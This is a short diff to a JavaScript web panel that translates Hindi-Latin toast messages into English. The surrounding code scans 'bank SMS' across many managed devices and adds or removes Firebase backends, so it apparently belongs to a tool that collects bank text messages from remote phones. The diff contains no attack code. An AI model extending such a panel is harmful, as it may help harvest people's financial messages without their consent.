@@ -474,7 +474,7 @@ function setDevFilter(mode,btn){
   if(mode==='bank'){
     var pending=allDevs.some(function(d){return deviceBankCache[d.id]===undefined;});
     if(pending){
-      toast('Bank SMS scan ho raha hai...',true);
+      toast('Scanning bank SMS...',true);
       scanAllDevicesBank().then(function(){renderDevices();updateStats();});
       return;
     }
@@ -540,9 +540,9 @@ function addFirebaseProject(){
   var url=document.getElementById('fbAddUrl').value.trim().replace(/\/$/,'');
   var secret=document.getElementById('fbAddSecret').value.trim();
   var apiKey=document.getElementById('fbAddApiKey').value.trim();
-  if(!name||!url){toast('Project name aur Firebase URL zaroori hai',false);return;}
+  if(!name||!url){toast('Project name and Firebase URL are required',false);return;}
   if(firebaseConfigs.some(function(c){return (c.databaseURL||'').replace(/\/$/,'')===url;})){
-    toast('Yeh Firebase URL pehle se added hai',false);return;
+    toast('This Firebase URL is already added',false);return;
   }
   var id='fb_'+Date.now();
   var cfg={
@@ -574,7 +574,7 @@ function addFirebaseProject(){
   closeFbSheet();
 }
 function removeFirebaseProject(id){
-  if(firebaseConfigs.length<=1){toast('Kam se kam 1 Firebase chahiye',false);return;}
+  if(firebaseConfigs.length<=1){toast('At least one Firebase project is required',false);return;}
   adminApiPost({action:'delete',id:id}).then(function(res){
     if(!res||!res.ok){toast((res&&res.error)||'Delete failed',false);return;}
     reloadServerFirebase().then(function(){
